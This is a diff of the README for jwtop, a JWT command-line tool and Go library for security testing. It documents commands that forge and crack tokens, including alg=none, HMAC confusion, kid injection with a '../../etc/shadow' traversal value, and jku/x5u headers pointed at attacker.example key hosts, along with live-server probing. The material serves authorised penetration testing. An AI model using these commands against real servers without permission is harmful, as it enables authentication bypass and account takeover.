@@ -8,7 +8,6 @@
 [![Build](https://img.shields.io/github/actions/workflow/status/cerberauth/jwtop/ci.yml?branch=main&label=build&style=for-the-badge)](https://github.com/cerberauth/jwtop/actions/workflows/ci.yml)
 [![Release](https://img.shields.io/github/v/release/cerberauth/jwtop?sort=semver&style=for-the-badge)](https://github.com/cerberauth/jwtop/releases)
 [![Coverage](https://img.shields.io/codecov/c/gh/cerberauth/jwtop?token=BD1WPXJDAW&style=for-the-badge)](https://codecov.io/gh/cerberauth/jwtop)
-[![Go Report Card](https://goreportcard.com/badge/github.com/cerberauth/jwtop?style=for-the-badge)](https://goreportcard.com/report/github.com/cerberauth/jwtop)
 [![GoDoc](https://img.shields.io/badge/godoc-reference-5272B4.svg?style=for-the-badge)](https://godoc.org/github.com/cerberauth/jwtop)
 [![Stars](https://img.shields.io/github/stars/cerberauth/jwtop?style=for-the-badge)](https://github.com/cerberauth/jwtop)
 [![License](https://img.shields.io/github/license/cerberauth/jwtop?style=for-the-badge)](https://github.com/cerberauth/jwtop/blob/main/LICENSE)
@@ -17,11 +16,11 @@
 
 ---
 
-JWTop is a Go library and CLI for working with JSON Web Tokens. It covers the full JWT lifecycle: decoding, verifying, creating, and signing tokens — plus a security-testing layer for probing and exploiting common JWT vulnerabilities.
+JWTop is a CLI for working with JSON Web Tokens. It covers the full JWT lifecycle — decoding, verifying, creating, and signing tokens — plus a security-testing layer for probing and exploiting common JWT vulnerabilities. (It's also available as a Go library — see [Library Usage](#library-usage) at the end of this README.)
 
-- **CLI** — decode, verify, create, sign, crack, and exploit tokens from the terminal
-- **Library** — composable Go packages for each operation, designed for direct integration
-- **Security testing** — built-in exploit primitives (alg=none, HMAC confusion, kid injection, JWK header injection, blank secret, null signature, psychic signature) and a server vulnerability scanner
+- **Inspect** — decode, diff, and verify tokens from the terminal, with human-readable claim descriptions and expiry status
+- **Mint** — create, sign, and re-sign tokens, and generate signing keys/secrets for any supported algorithm
+- **Attack** — built-in exploit primitives (alg=none, HMAC confusion, kid injection, JWK header injection, blank secret, null signature, psychic signature) and a server vulnerability scanner
 
 > **Disclaimer:** The `exploit` and `crack` functionality is intended for authorised security testing, penetration testing, CTF competitions, and educational purposes only. Never test systems you do not own or have explicit written permission to test.
 
@@ -29,27 +28,27 @@ JWTop is a Go library and CLI for working with JSON Web Tokens. It covers the fu
 
 ## Features
 
-| Feature | CLI | Library |
-|---------|:---:|:-------:|
-| Decode JWT (no verification) | ✓ | ✓ |
-| Verify signature (HMAC, RSA, ECDSA, JWKS) | ✓ | ✓ |
-| Create and sign new tokens | ✓ | ✓ |
-| Re-sign existing tokens | ✓ | ✓ |
-| Crack HMAC secret (dictionary attack, optional john/hashcat fallback) | ✓ | ✓ |
-| Probe server for JWT vulnerabilities | ✓ | ✓ |
-| alg=none bypass | ✓ | ✓ |
-| Blank secret | ✓ | ✓ |
-| Null signature | ✓ | ✓ |
-| HMAC confusion (RSA/EC → HMAC) | ✓ | ✓ |
-| Psychic signature (ECDSA r=0, s=0) | ✓ | ✓ |
-| kid injection (SQL, path traversal, command, LDAP, raw) | ✓ | ✓ |
-| JWK header injection (CVE-2018-0114) | ✓ | ✓ |
+| Feature |
+|---------|
+| Decode JWT (no verification), with claim descriptions and expiry status |
+| Verify signature (HMAC, RSA, ECDSA, JWKS) |
+| Diff two or more tokens (header/claims/signature) |
+| Create and sign new tokens |
+| Generate signing keys / secrets (RSA, EC, EdDSA, HMAC) |
+| Re-sign existing tokens |
+| Crack HMAC secret (dictionary attack, optional john/hashcat fallback) |
+| Probe server for JWT vulnerabilities |
+| alg=none bypass |
+| Blank secret |
+| Null signature |
+| HMAC confusion (RSA/EC → HMAC) |
+| Psychic signature (ECDSA r=0, s=0) |
+| kid injection (SQL, path traversal, command, LDAP, raw) |
+| JWK header injection (CVE-2018-0114) |
 
 ---
 
 ## Installation
-
-### CLI
 
 **Using `go install`:**
 
@@ -71,24 +70,6 @@ See [Docker](#docker) below for volume mounts, Compose, and CI usage.
 git clone https://github.com/cerberauth/jwtop.git
 cd jwtop
 go build -o jwtop .
-```
-
-### Library
-
-Install only the packages you need:
-
-```sh
-# Core operations (decode, verify, create, sign)
-go get github.com/cerberauth/jwtop/jwt
-
-# Token editor (re-sign and mutate existing tokens)
-go get github.com/cerberauth/jwtop/jwt/editor
-
-# Security exploit primitives
-go get github.com/cerberauth/jwtop/jwt/exploit
-
-# Server vulnerability prober
-go get github.com/cerberauth/jwtop/jwt/crack
 ```
 
 ---
@@ -122,7 +103,9 @@ See the [Docker guide](./docs/docker.mdx) for Compose usage, network joining to 
 jwtop [command] [flags]
 
 Commands:
+  find      Extract JWT tokens from text, a file, or stdin
   decode    Decode and pretty-print a JWT
+  diff      Compare two or more JWTs and show header/claims/signature differences
   verify    Verify a JWT signature
   create    Create and sign a new JWT
   sign      Re-sign an existing JWT
@@ -131,32 +114,100 @@ Commands:
   version   Print version information
 ```
 
+Every command that accepts a `<token>` argument also reads it from stdin when the argument is omitted, so `find` composes directly into a pipeline: `jwtop find --file page.html | jwtop decode`.
+
+### find
+
+Extract JWT tokens hidden anywhere in text — a URL, a JSON payload, an HTML page, an `Authorization` header, a log file — and print each one found, one per line.
+
+```sh
+jwtop find [text]
+jwtop find --file <path>
+echo <text> | jwtop find
+```
+
+```sh
+# Extract every JWT from a captured HTTP response
+curl -s https://api.example.com/profile | jwtop find
+
+# Decode the first JWT found in a file
+jwtop find --file response.html | head -1 | jwtop decode
+
+# Verify every JWT in a log file
+jwtop find --file app.log | while read tok; do
+  jwtop verify "$tok" --secret mysecret && echo "OK: $tok"
+done
+```
+
+---
+
 ### decode
 
-Decode and pretty-print a JWT without verifying the signature.
+Decode and pretty-print a JWT without verifying the signature. By default, recognized header/claim fields get a short description appended right next to the value as an inline `// comment`, `exp`/`nbf`/`iat` also show a human-readable date, and a one-line expiry status is printed after the signature. Pass `--raw` for plain, valid JSON with none of that — e.g. for piping into `jq`.
 
 ```sh
 jwtop decode <token>
+echo <token> | jwtop decode
+jwtop decode --raw <token>
 ```
 
 ```sh
-jwtop decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
+jwtop decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzU2ODk2MDAsInN1YiI6MTIzNDU2Nzg5MH0.jMhZZlt521nYVwt2toBcu_JmifJj9cqDFHftZvZhWOs
 ```
+
+Output:
 
 ```
 Header:
 {
-  "alg": "HS256",
-  "typ": "JWT"
+  "alg": "HS256",  // Algorithm — how the token is signed (or "none")
+  "typ": "JWT"  // Type — media type of the token, typically "JWT"
 }
 
 Claims:
 {
-  "sub": "1234567890"
+  "exp": 1735689600,  // Expiration Time — token must be rejected after this time — 2025-01-01T00:00:00Z (616 days ago)
+  "sub": 1234567890  // Subject — the principal the token is about
 }
 
 Signature:
-dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
+jMhZZlt521nYVwt2toBcu_JmifJj9cqDFHftZvZhWOs
+
+⚠ Token is EXPIRED (expired 616 days ago)
+```
+
+---
+
+### diff
+
+Compare a base JWT against one or more other JWTs and report which header fields, claims, and the signature differ. Exits `1` if any differences are found — useful as a CI gate to catch unexpected token drift.
+
+```sh
+jwtop diff <base-token> <other-token> [<other-token>...]
+jwtop find --file page.html | jwtop diff
+```
+
+`--format text` (default) prints a human-readable summary; `--format json` prints a machine-readable report for scripts and automation.
+
+```sh
+jwtop diff $OLD_TOKEN $NEW_TOKEN
+```
+
+Output:
+
+```
+Base: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+--- Token 1: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+  Claims:
+    - iat: 1516239022
+    - name: "John Doe"
+    + role: "admin"
+  Signature: changed
+```
+
+```sh
+jwtop diff $OLD_TOKEN $NEW_TOKEN --format json | jq '.diffs[0].claims'
 ```
 
 ---
@@ -223,6 +274,47 @@ jwtop create --alg RS256 --key /path/to/private.pem --sub user123 --exp 24h
 
 ---
 
+### genkey
+
+Generate signing key material for an algorithm, with the parameters under your
+control but weak choices refused: RSA keys are at least 2048 bits, HMAC secrets
+at least the MAC output size, and every byte comes from the `crypto/rand`
+CSPRNG. Private keys and secrets are PKCS#8 / PKIX PEM or an encoding you pick.
+
+```sh
+jwtop genkey --alg <alg> [options]
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Target algorithm: `HS256`/`384`/`512`, `RS*`, `PS*`, `ES256`/`384`/`512`, `EdDSA` **(required)** |
+| `--rsa-bits` | RSA modulus size (RSA only; default `2048`, minimum `2048`) |
+| `--secret-bytes` | HMAC secret length in bytes (HMAC only; default matches the MAC output size) |
+| `--secret-format` | HMAC secret encoding: `base64url` (default), `base64`, `hex`, `raw` |
+| `--out` | Write to this path instead of stdout; the public key goes to `<out>.pub` |
+| `--force` | Overwrite existing files at `--out` |
+| `--public-only` | Emit only the public key (asymmetric algorithms only) |
+
+```sh
+# HS256 secret to stdout (base64url)
+jwtop genkey --alg HS256
+
+# 64-byte HS512 secret as hex
+jwtop genkey --alg HS512 --secret-bytes 64 --secret-format hex
+
+# RSA 3072-bit key pair to files: private.pem (0600) + private.pem.pub (0644)
+jwtop genkey --alg RS256 --rsa-bits 3072 --out private.pem
+
+# ECDSA P-256 key pair, then mint a token with it
+jwtop genkey --alg ES256 --out es256
+jwtop create --alg ES256 --key es256 --sub user123
+```
+
+> Treat the printed private key or secret as a credential: store it in a secret
+> manager, never commit it, and rotate it on a schedule.
+
+---
+
 ### sign
 
 Re-sign an existing JWT with a new algorithm or key. Original claims are preserved.
@@ -257,6 +349,9 @@ jwtop crack <token> [--wordlist <file>] [--secret <s>...] [--workers <n>]
 
 # Online — probe a live server
 jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wordlist <file>] [--secret <s>...] [--workers <n>] [--delay <duration>]
+
+# Online — add claim-mutation fuzzing
+jwtop crack <token> --url <url> --fuzz [--fuzz-max-string-len <n>]
 ```
 
 | Flag | Description |
@@ -270,6 +365,8 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `--delay` | Delay between probe requests to the target URL, e.g. `200ms` (default: no delay) |
 | `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
 | `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
+| `--jku-server-addr` | Bind address for a local JWKS server used by the `jkuinjection` check, e.g. `0.0.0.0:8089` (must be reachable by the target; check is skipped if unset) |
+| `--x5u-server-addr` | Bind address for a local certificate server used by the `x5uinjection` check, e.g. `0.0.0.0:8090` (must be reachable by the target; check is skipped if unset) |
 | `--token-in` | Where to place the exploited JWT: `header`, `cookie`, `query`, or `body` (default `header`) |
 | `--token-name` | Header/cookie/query/form-field name for the JWT (default `Authorization` for header, `token` otherwise) |
 | `--token-prefix` | Value prefix before the token, e.g. `Bearer ` (default `Bearer ` only for the default Authorization header) |
@@ -278,6 +375,8 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `--hashcat` | Fall back to the external `hashcat` tool for HMAC secret cracking if the built-in dictionary attack doesn't find it |
 | `--hashcat-path` | Path to the `hashcat` binary — passing this implies `--hashcat`, so PATH resolution is only needed when this is omitted |
 | `--crack-timeout` | Max time to let `john`/`hashcat` run before stopping them (default `5m`) |
+| `--fuzz` | Enable claim-mutation fuzzing (type confusion, oversized strings, special characters, null) and flag responses that diverge from the baseline — requires `--url` |
+| `--fuzz-max-string-len` | Length of the oversized-string payload used by `--fuzz` (default `10000`) |
 
 `--john`/`--hashcat` are entirely optional and off by default; when either tool is detected on `PATH` but not enabled, jwtop prints a one-line suggestion to stderr. See [External cracking tools](#external-cracking-tools-john--hashcat) below.
 
@@ -290,7 +389,9 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `nullsig` | Token has an empty signature segment |
 | `weaksecret` | Cracks the HMAC signing secret via dictionary attack |
 
-**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114).
+**Online-only checks** (require `--url`): `algnone` (×4 casing variants), `hmacconfusion` (requires `--key`), `psychicsig` (ECDSA-only), `kidinjection` (SQL and path traversal), `jwkinjection` (RSA/ECDSA-only, CVE-2018-0114), `jkuinjection` (RSA/ECDSA-only, requires `--jku-server-addr`), `x5cinjection` (RSA/ECDSA-only), `x5uinjection` (RSA/ECDSA-only, requires `--x5u-server-addr`), `fuzz` (claim-mutation fuzzing, opt-in via `--fuzz`).
+
+**`fuzz`** — off by default, enabled with `--fuzz`. Complements the fixed checks above by mutating every claim value (type confusion, an oversized string, special characters, an explicit null) and comparing each mutated response against a reference response captured from the original token. It flags a mutation when the response diverges: a `5xx` status, a leaked stack trace/exception, or a body length far from the reference's — signs of a parsing bug the fixed checks don't target. `--fuzz-max-string-len` controls the oversized-string payload length.
 
 > Command and LDAP kid injection (`jwtop exploit kidinjection --mode command|ldap`) are exploit-only for now — the `crack` server probe does not yet include these two techniques.
 
@@ -318,6 +419,9 @@ jwtop crack $TOKEN --url https://api.example.com/protected --token-in body --tok
 
 # Online — JWT expected in a custom header
 jwtop crack $TOKEN --url https://api.example.com/protected --token-in header --token-name X-Auth-Token --token-prefix "Token "
+
+# Online — add claim-mutation fuzzing to the fixed check set
+jwtop crack $TOKEN --url https://api.example.com/protected --fuzz
 ```
 
 Exits `0` when at least one vulnerability was found, `1` when none were.
@@ -373,6 +477,9 @@ jwtop exploit <subcommand> <token> [flags]
 | `weaksecret` | Dictionary-attack the HMAC signing secret |
 | `kidinjection` | Manipulate the `kid` header field and re-sign |
 | `jwkinjection` | Embed a self-signed JWK in the header and re-sign (CVE-2018-0114) |
+| `jkuinjection` | Point `jku` at an attacker-controlled JWKS URL and re-sign |
+| `x5cinjection` | Embed a self-signed certificate in the `x5c` header and re-sign |
+| `x5uinjection` | Point `x5u` at an attacker-controlled certificate URL and re-sign |
 
 **algnone**
 
@@ -466,6 +573,47 @@ jwtop exploit jwkinjection $TOKEN --key /path/to/private.pem  # re-sign with an 
 | `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
 | `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
 
+**jkuinjection** — generates a self-signed RSA/ECDSA key pair, points the token's `jku` header at `--url`, and re-signs with the matching private key. `--url` must serve a JWKS document containing the matching public key — this command only sets the header and signs; it does not host the JWKS itself. Servers that fetch `jku` and trust its contents without validating the URL against an allowlist accept the forged token. To have jwtop also host the JWKS during a live probe, use `jwtop crack --jku-server-addr` instead.
+
+```sh
+jwtop exploit jkuinjection $TOKEN --url https://attacker.example/.well-known/jwks.json                            # generates an RS256 key pair
+jwtop exploit jkuinjection $TOKEN --alg ES256 --url https://attacker.example/.well-known/jwks.json                # generates an ES256 key pair
+jwtop exploit jkuinjection $TOKEN --key /path/to/private.pem --url https://attacker.example/.well-known/jwks.json # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+| `--url` | Attacker-controlled URL serving a JWKS with the matching public key (required) |
+
+**x5cinjection** — generates a self-signed RSA/ECDSA key pair and a throwaway X.509 certificate, embeds the certificate's DER bytes directly in the token's `x5c` header field, and re-signs with the matching private key. Servers that trust a certificate embedded in `x5c` instead of validating it against a pinned CA or certificate store accept the forged token.
+
+```sh
+jwtop exploit x5cinjection $TOKEN                            # generates an RS256 key pair
+jwtop exploit x5cinjection $TOKEN --alg ES256                 # generates an ES256 key pair
+jwtop exploit x5cinjection $TOKEN --key /path/to/private.pem  # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+
+**x5uinjection** — generates a self-signed RSA/ECDSA key pair and a throwaway X.509 certificate, points the token's `x5u` header at `--url`, and re-signs with the matching private key. `--url` must serve the certificate as a PEM document — this command only sets the header and signs; it does not host the certificate itself. Servers that fetch `x5u` and trust its contents without validating the URL against an allowlist or pinned CA accept the forged token. To have jwtop also host the certificate during a live probe, use `jwtop crack --x5u-server-addr` instead.
+
+```sh
+jwtop exploit x5uinjection $TOKEN --url https://attacker.example/cert.pem                            # generates an RS256 key pair
+jwtop exploit x5uinjection $TOKEN --alg ES256 --url https://attacker.example/cert.pem                # generates an ES256 key pair
+jwtop exploit x5uinjection $TOKEN --key /path/to/private.pem --url https://attacker.example/cert.pem # re-sign with an existing key instead
+```
+
+| Flag | Description |
+|------|-------------|
+| `--alg` | Signing algorithm for the generated key pair (default `RS256`) |
+| `--key` | Path or URL to PEM private key file (overrides generating a new key pair) |
+| `--url` | Attacker-controlled URL serving a PEM certificate with the matching public key (required) |
+
 ---
 
 ## Agent Skills
@@ -510,7 +658,35 @@ Then ask your agent things like "what's in this JWT", "audit this token for vuln
 
 ---
 
+## Supported Algorithms
+
+| Family | Algorithms |
+|--------|-----------|
+| HMAC | HS256, HS384, HS512 |
+| RSA | RS256, RS384, RS512 |
+| RSA-PSS | PS256, PS384, PS512 |
+| ECDSA | ES256, ES384, ES512 |
+| None | none |
+
+---
+
 ## Library Usage
+
+Every CLI command is a thin wrapper around a composable Go package, published under this same module — install only what you need:
+
+```sh
+# Core operations (decode, verify, create, sign)
+go get github.com/cerberauth/jwtop/jwt
+
+# Token editor (re-sign and mutate existing tokens)
+go get github.com/cerberauth/jwtop/jwt/editor
+
+# Security exploit primitives
+go get github.com/cerberauth/jwtop/jwt/exploit
+
+# Server vulnerability prober
+go get github.com/cerberauth/jwtop/jwt/crack
+```
 
 ### Core operations — `jwt`
 
@@ -562,6 +738,19 @@ token, err = jwt.Create(jwt.CreateOptions{
 }, privateKey)
 ```
 
+**Generate keys:**
+
+```go
+// HMAC secret (crypto/rand; length defaults to the MAC output size, min enforced)
+k, err := jwt.GenerateKeyPair(jwt.GenerateKeyOptions{Algorithm: "HS256"})
+secret := k.Secret
+b64url, _ := k.EncodeSecret(jwt.SecretFormatBase64URL)
+
+// Asymmetric key pair (RSA >= 2048 enforced; PKCS#8 / PKIX PEM)
+k, err = jwt.GenerateKeyPair(jwt.GenerateKeyOptions{Algorithm: "RS256", RSABits: 3072})
+privPEM, pubPEM := k.PrivatePEM, k.PublicPEM
+```
+
 ### Token editor — `jwt/editor`
 
 Parse an existing token (without verifying it) and re-sign with a different algorithm or key.
@@ -600,6 +789,14 @@ tokens, err  = exploit.KidLDAPInjectionAll(tokenString, []byte(""))     // one t
 token, err   = exploit.KidInjection(tokenString, "../../etc/shadow", jwtlib.SigningMethodHS256, []byte(""))
 token, err   = exploit.JWKInjection(tokenString, jwtlib.SigningMethodRS256)                    // generates key pair
 token, err   = exploit.JWKInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey) // use existing key
+token, err   = exploit.JKUInjection(tokenString, jwtlib.SigningMethodRS256, jwksURL)                    // generates key pair
+token, err   = exploit.JKUInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey, jwksURL) // use existing key
+token, srv, err := exploit.JKUInjectionWithLocalServer(tokenString, jwtlib.SigningMethodRS256, "127.0.0.1:0") // also hosts the JWKS
+token, err   = exploit.X5CInjection(tokenString, jwtlib.SigningMethodRS256)                    // generates key pair + self-signed cert
+token, err   = exploit.X5CInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey) // use existing key
+token, err   = exploit.X5UInjection(tokenString, jwtlib.SigningMethodRS256, certURL)                    // generates key pair + self-signed cert
+token, err   = exploit.X5UInjectionWithKey(tokenString, jwtlib.SigningMethodRS256, privateKey, certURL) // use existing key
+token, srv, err := exploit.X5UInjectionWithLocalServer(tokenString, jwtlib.SigningMethodRS256, "127.0.0.1:0") // also hosts the certificate
 
 // HMAC secret cracking
 result, err := exploit.CrackSecret(tokenString, exploit.WeakSecrets(), 8)
@@ -622,6 +819,9 @@ results, err := crack.ProbeAll(ctx, tokenString, crack.ProbeOptions{
     Workers:        8,
     // TokenLocation defaults to Authorization: Bearer <token> when omitted.
     TokenLocation: crack.TokenLocation{In: "cookie", Name: "session"},
+    // Fuzz enables claim-mutation fuzzing (off by default); FuzzMaxStringLen
+    // defaults to fuzz.DefaultMaxStringLen when left at 0.
+    Fuzz: true,
 })
 for _, r := range results {
     switch {
@@ -647,18 +847,6 @@ keyfunc, err := jwt.FetchJWKS("https://example.com/.well-known/jwks.json")
 method, err  := jwt.ParseSigningMethod("ES256")
 ok           := jwt.IsJWT(tokenString)
 ```
-
----
-
-## Supported Algorithms
-
-| Family | Algorithms |
-|--------|-----------|
-| HMAC | HS256, HS384, HS512 |
-| RSA | RS256, RS384, RS512 |
-| RSA-PSS | PS256, PS384, PS512 |
-| ECDSA | ES256, ES384, ES512 |
-| None | none |
 
 ---
 
